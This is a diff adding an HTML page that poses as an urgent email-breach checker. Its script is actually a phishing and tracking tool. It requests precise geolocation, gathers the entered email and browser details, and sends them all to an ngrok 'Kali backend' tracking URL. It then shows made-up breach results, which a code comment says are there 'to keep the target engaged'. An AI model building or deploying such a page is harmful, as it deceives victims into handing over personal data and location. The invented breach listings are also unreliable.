@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Urgent Security Alert: Check Your Email Breach Status Now!</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: #0c0c1b;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 700px;
+            text-align: center;
+            border: 1px solid #333;
+        }
+        h1 {
+            color: #ff3b3b;
+            margin-bottom: 20px;
+            font-size: 2.2em;
+            text-shadow: 0 0 10px rgba(255, 59, 59, 0.7);
+        }
+        p {
+            margin-bottom: 25px;
+            line-height: 1.6;
+            font-size: 1.1em;
+            color: #bbbbbb;
+        }
+        .input-group {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+        input[type="email"] {
+            padding: 15px 20px;
+            border: 1px solid #555;
+            border-radius: 8px;
+            font-size: 1.1em;
+            background-color: #222;
+            color: #eee;
+            width: calc(100% - 160px); /* Adjust width for button */
+            max-width: 400px;
+            margin-right: 10px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #ff4500;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 4px 15px rgba(255, 69, 0, 0.4);
+        }
+        button:hover {
+            background-color: #e03a00;
+            transform: translateY(-2px);
+        }
+        .results-area {
+            background-color: #1a1a2e;
+            padding: 25px;
+            border-radius: 10px;
+            border: 1px solid #444;
+            text-align: left;
+            min-height: 150px;
+            display: none; /* Hidden until results are shown */
+            margin-top: 25px;
+        }
+        .results-area h2 {
+            color: #4CAF50;
+            margin-top: 0;
+            margin-bottom: 15px;
+            font-size: 1.8em;
+            text-shadow: 0 0 8px rgba(76, 175, 80, 0.6);
+        }
+        .results-area p {
+            margin-bottom: 10px;
+            font-size: 1em;
+            color: #ccc;
+        }
+        .breach-item {
+            background-color: #2e1a1a;
+            border-left: 5px solid #ff3b3b;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+        }
+        .breach-item strong {
+            color: #ff3b3b;
+        }
+        .loading {
+            display: none;
+            color: #ffd700;
+            margin-top: 20px;
+            font-size: 1.2em;
+        }
+        @media (max-width: 600px) {
+            .input-group {
+                flex-direction: column;
+            }
+            input[type="email"] {
+                width: 100%;
+                margin-right: 0;
+                margin-bottom: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚨 Critical Security Alert: Verify Your Email! 🚨</h1>
+        <p>A recent surge in data breaches has put millions of accounts at risk. Enter your email below to instantly check if your personal information has been compromised in any known data leaks. Act fast to secure your digital identity!</p>
+        <div class="input-group">
+            <input type="email" id="emailInput" placeholder="Your Email Address" required>
+            <button onclick="checkBreaches()">Check My Email</button>
+        </div>
+        <div class="loading" id="loadingMessage">Scanning databases... Please wait.</div>
+        <div class="results-area" id="resultsArea">
+            <h2 id="resultsTitle"></h2>
+            <div id="breachDetails"></div>
+            <p style="margin-top: 20px; color: #888;">*Powered by anonymous breach monitoring services.</p>
+        </div>
+    </div>
+
+    <script>
+        // --- !!! USER: REPLACE THIS WITH YOUR NGROK PUBLIC URL !!! ---
+        // Your Ngrok URL will look something like: https://xxxx-xx-xxx-xxx-xx.ngrok-free.app
+        const KALI_BACKEND_URL = "https://sporogonial-kizzy-paneless.ngrok-free.dev/track"; 
+        // Example: "https://a1b2c3d4e5f6.ngrok-free.app/track";
+        // --- !!! ENSURE IT ENDS WITH /track !!! ---
+
+        async function checkBreaches() {
+            const email = document.getElementById('emailInput').value;
+            if (!email) {
+                alert('Please enter an email address.');
+                return;
+            }
+
+            document.getElementById('loadingMessage').style.display = 'block';
+            document.getElementById('resultsArea').style.display = 'none';
+
+            let geoData = {
+                latitude: null,
+                longitude: null,
+                accuracy: null,
+                altitude: null,
+                altitudeAccuracy: null,
+                heading: null,
+                speed: null,
+                timestamp: null,
+                permission: 'denied' // Default to denied
+            };
+
+            // Attempt to get precise geolocation
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                geoData = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy, // In meters, reflects WiFi/GPS/cell triangulation
+                    altitude: position.coords.altitude,
+                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                    heading: position.coords.heading,
+                    speed: position.coords.speed,
+                    timestamp: position.timestamp,
+                    permission: 'granted'
+                };
+            } catch (error) {
+                console.error("Geolocation error:", error);
+                if (error.code === error.PERMISSION_DENIED) {
+                    geoData.permission = 'denied';
+                } else if (error.code === error.POSITION_UNAVAILABLE) {
+                    geoData.permission = 'unavailable';
+                } else if (error.code === error.TIMEOUT) {
+                    geoData.permission = 'timeout';
+                }
+            }
+
+            // Gather other data
+            const userData = {
+                email: email,
+                userAgent: navigator.userAgent,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                referrer: document.referrer,
+                geolocation: geoData
+            };
+
+            // Send data to your Kali backend
+            try {
+                const response = await fetch(KALI_BACKEND_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(userData),
+                    mode: 'cors' // Crucial for cross-origin requests from GitHub Pages to Ngrok
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                console.log("Tracking data sent successfully!");
+
+            } catch (error) {
+                console.error("Failed to send tracking data to Kali:", error);
+                // Even if sending fails, we can still show a mock breach result to keep the target engaged
+            }
+
+            // Simulate breach results (for frontend display)
+            // In a real scenario, you'd fetch this from a secure backend to a real API like HaveIBeenPwned
+            setTimeout(() => {
+                document.getElementById('loadingMessage').style.display = 'none';
+                document.getElementById('resultsArea').style.display = 'block';
+                const breachDetails = document.getElementById('breachDetails');
+
+                // Mock response for the frontend for user engagement
+                if (email.includes("example.com")) { // Just an example trigger for a "breach"
+                    document.getElementById('resultsTitle').innerText = `😱 Oh no! ${email} found in breaches!`;
+                    breachDetails.innerHTML = `
+                        <div class="breach-item">
+                            <p><strong>Database:</strong> DarkForum Leaks</p>
+                            <p><strong>Compromised Data:</strong> Email Addresses, Passwords (hashed), Usernames</p>
+                            <p><strong>Date:</strong> 2022-03-15</p>
+                        </div>
+                        <div class="breach-item">
+                            <p><strong>Database:</strong> IdentityTheftCorp</p>
+                            <p><strong>Compromised Data:</strong> Email Addresses, Phone Numbers</p>
+                            <p><strong>Date:</strong> 2023-01-20</p>
+                        </div>
+                        <p style="color: #ff3b3b; font-weight: bold; margin-top: 15px;">We recommend changing your password immediately for all affected accounts!</p>
+                    `;
+                } else {
+                    document.getElementById('resultsTitle').innerText = `✅ Good News! No known breaches for ${email}.`;
+                    breachDetails.innerHTML = `<p>Our scan indicates that your email address has not been found in publicly disclosed data breaches. Keep up good security practices!</p>`;
+                }
+            }, 3000); // Simulate network delay
+        }
+    </script>
+</body>
+</html>
